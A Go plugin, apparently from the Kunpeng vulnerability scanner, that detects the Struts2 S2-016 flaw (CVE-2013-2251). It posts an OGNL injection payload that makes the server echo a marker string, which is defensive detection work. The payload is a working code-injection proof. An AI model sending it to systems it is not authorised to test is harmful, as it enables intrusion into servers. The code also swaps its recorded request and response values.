package goplugin

import (
	"net/http"
	"regexp"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type struts2_16 struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("struts2", &struts2_16{})
}
func (d *struts2_16) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Struts2 s2-016 远程代码执行",
		Remarks: `struts2中 DefaultActionMapper类支持以"action:"、"redirect:"、"redirectAction:"作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令，进而直接导致服务器被入侵控制。`,
		Level:   0,
		Type:    "RCE",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://github.com/vulhub/vulhub/tree/master/struts2/s2-016",
			CVE:  "CVE-2013-2251",
			KPID: "KP-0036",
		},
	}
	return d.info
}
func (d *struts2_16) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}
func (d *struts2_16) Check(URL string, meta plugin.TaskMeta) (b bool) {
	poc := "redirect:${%23out%3D%23context.get(new java.lang.String(new byte[]{99,111,109,46,111,112,101,110,115,121,109,112,104,111,110,121,46,120,119,111,114,107,50,46,100,105,115,112,97,116,99,104,101,114,46,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101})).getWriter(),%23out.println(new java.lang.String(new byte[]{46,46,81,116,101,115,116,81,46,46})),%23redirect,%23out.close()}"
	var checkURL string
	for _, url := range meta.FileList {
		if ok, _ := regexp.MatchString(`\.(do|action)$`, url); ok {
			checkURL = url
			break
		}
	}
	if checkURL == "" {
		return false
	}
	request, err := http.NewRequest("POST", checkURL, strings.NewReader(poc))
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if err != nil {
		return false
	}
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "QtestQ") {
		result := d.info
		result.Response = resp.RequestRaw
		result.Request = resp.ResponseRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
